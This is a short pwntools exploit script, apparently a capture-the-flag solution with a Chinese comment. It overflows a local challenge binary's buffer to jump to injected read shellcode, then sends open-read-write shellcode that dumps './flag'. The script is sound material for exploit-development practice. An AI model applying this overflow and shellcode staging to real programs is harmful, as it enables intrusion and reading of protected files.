# 第二种方法就是我们知道执行完自己构造的read函数后，会接下去执行接下来的代码，那我们把orw读到read函数后面紧紧接上去不就好了吗
from pwn import *

context(log_level='debug', arch='amd64', os='linux')
p = process('./pwn')

shellcode = shellcraft.open('./flag')
shellcode += shellcraft.read('rax', 'rsp', 0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100)
payload1 = asm(shellcode)

sh = asm(shellcraft.read(0, '0x233014', 0x42))
p.recvuntil('little.\n')
p.sendline(sh)
p.recvuntil('time~\n')
payload = b'a' * 0x38 + p64(0x233000)
p.sendline(payload)
p.recvuntil('you!\n')
# p.sendline('666')
p.sendline(payload1)
print(hex(len(payload1)))
p.interactive()
